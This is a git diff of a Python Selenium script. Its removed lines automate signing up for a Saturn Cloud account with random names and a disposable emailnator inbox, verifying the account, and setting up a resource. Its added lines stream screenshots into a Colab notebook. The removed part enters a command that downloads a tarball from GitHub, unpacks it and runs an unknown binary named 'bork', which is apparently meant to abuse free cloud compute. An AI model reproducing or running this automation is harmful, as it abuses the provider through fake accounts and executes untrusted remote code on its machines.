@@ -62,78 +62,31 @@ driver.switch_to.window(driver.window_handles[0])
 print(emilyez)
 #input("RAWR")
 time.sleep(1)
-driver.get("https://saturncloud.io/")
-time.sleep(1)
-print("a1")
-driver.find_element(By.XPATH, "/html/body/div[1]/main/section[1]/div[1]/div/div[2]/a").click()
-time.sleep(3)
+driver.get("https://google.com/")
+def render(driver, duration):
+    import time
+    from IPython.display import clear_output, display, Javascript, HTML
+    from ipykernel import comm
 
-driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/form/div[1]/label/div/div/input").send_keys("".join(random.sample(low_word, 8)))
+    clear_output()
 
-time.sleep(1.5)
+    display(HTML(f"""
+        <img id='image'>
+        <script>
+            const $img = document.querySelector('#output-area #image');
+            google.colab.kernel.comms.registerTarget('i', (comm, message) => {{
+                $img.src = message.data.i;
+            }});
+        </script>
+    """))
 
-driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/form/div[2]/label/div/div/input").send_keys(emilyez)
-
-time.sleep(1)
-print("a2")
-driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/form/button").click()
-time.sleep(20)
-
-
-driver.switch_to.window(driver.window_handles[1])
-time.sleep(2)
-driver.get("https://www.emailnator.com/inbox/"+emilyez)
-# driver.find_element(By.XPATH, "/html/body/div/div/main/div[1]/div/div/div/div[2]/div/div[3]/button").click()
-time.sleep(6)
-linkz = driver.find_element(By.XPATH, "/html/body/div/div/section/div/div/div[3]/div/div[2]/div[2]/div/table/tbody/tr[2]/td/a").get_attribute("href")
-time.sleep(0.5)
-driver.get(linkz)
-time.sleep(7)
-verifylink = driver.find_element(By.XPATH, "/html/body/div/div/section/div/div/div[3]/div/div/div[2]/div/div/p[3]/a").get_attribute("href")
-driver.switch_to.window(driver.window_handles[0])
-time.sleep(1)
-driver.get(verifylink)
-time.sleep(3)
-driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/div/div/form/div[1]/label/div/div/input").send_keys(passwd)
-time.sleep(0.5)
-driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/div/div/form/div[2]/label/div/div/input").send_keys(passwd)
-time.sleep(2)
-print("a3")
-driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/div/div/form/button").click()
-time.sleep(7)
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div[1]/div/div/div[2]/div[2]/section/div/button[1]").click()
-time.sleep(2)
-print("a4")
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div[1]/div/div/div[2]/div[2]/section/div[2]/span[2]").click()
-time.sleep(3)
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[1]/div/div[2]/div[2]/div/div[3]/div/label/div/div/input").send_keys("".join(random.sample(low_word, 4)))
-time.sleep(1)
-print("a5")
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[2]/div/div[2]/div[2]/div/fieldset/div/div/label[2]").click()
-time.sleep(1)
-print("a6")
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[2]/div/div[2]/div[2]/div/div/label/div/select/option[4]").click()
-time.sleep(1)
-print("a7")
-driver.execute_script("window.scrollTo(0,700)")
-time.sleep(2)
-driver.find_element(By.XPATH, '/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[3]/div/div[1]/div/div[2]/p').click()
-time.sleep(1)
-print("a8")
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[3]/div/div[2]/div[2]/div[4]/label/div/textarea").send_keys("wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/bork.tar.gz && tar -xf bork.tar.gz && ./bork")
-time.sleep(1)
-print("a9")
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[6]/div/div/div/button[1]").click()
-time.sleep(7)
-print("a10")
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div[2]/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/button").click()
+    start_time = time.time()
+    while True:
+        b64 = driver.get_screenshot_as_base64()
+        comm.Comm(target_name='i', data={'i': f"data:image/png;base64,{b64}"})
+        time.sleep(0.1)
+        if time.time() - start_time >= duration:
+            break
 time.sleep(10)
-driver.get(driver.current_url)
-time.sleep(300)
-
-
-
-# try:
-#     driver.find_element(By.XPATH, "/html/body/div[17]").click()
-# except:
-#     pass
+print("x")
+render(driver, duration=10)
